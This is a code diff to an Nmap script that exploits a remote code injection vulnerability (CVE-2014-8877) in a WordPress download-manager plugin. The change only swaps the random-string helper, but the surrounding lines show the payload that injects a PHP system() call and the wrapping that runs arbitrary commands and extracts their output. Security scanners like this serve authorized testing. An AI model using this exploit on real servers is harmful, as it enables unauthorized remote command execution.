@@ -5,6 +5,7 @@ local string = require "string"
 local url = require "url"
 local vulns = require "vulns"
 local base64 = require "base64"
+local rand = require "rand"
 
 description = [[
 Exploits a remote code injection vulnerability (CVE-2014-8877) in Wordpress CM
@@ -61,7 +62,7 @@ function genHttpReq(host, port, uri, cmd)
   if cmd ~= nil then
     payload = '".system("'..cmd..'")."'
   else
-    rnd = stdnse.generate_random_string(15)
+    rnd = rand.random_alpha(15)
     local encRnd = base64.enc(rnd)
     payload = '".base64_decode("'..encRnd..'")."'
   end
@@ -111,7 +112,7 @@ CMDsearch parameter to cmdownloads/, which is processed by the PHP
     -- exploit the vulnerability
     if cmd ~= nil then
        -- wrap cmd with pattern which is used to filter out only relevant output from the response
-       local pattern = stdnse.generate_random_string(5)
+       local pattern = rand.random_alpha(5)
        req = genHttpReq(host, port, uri, 'echo '..pattern..';'..cmd..';echo '..pattern..';')
 
        if req.status == 200 then
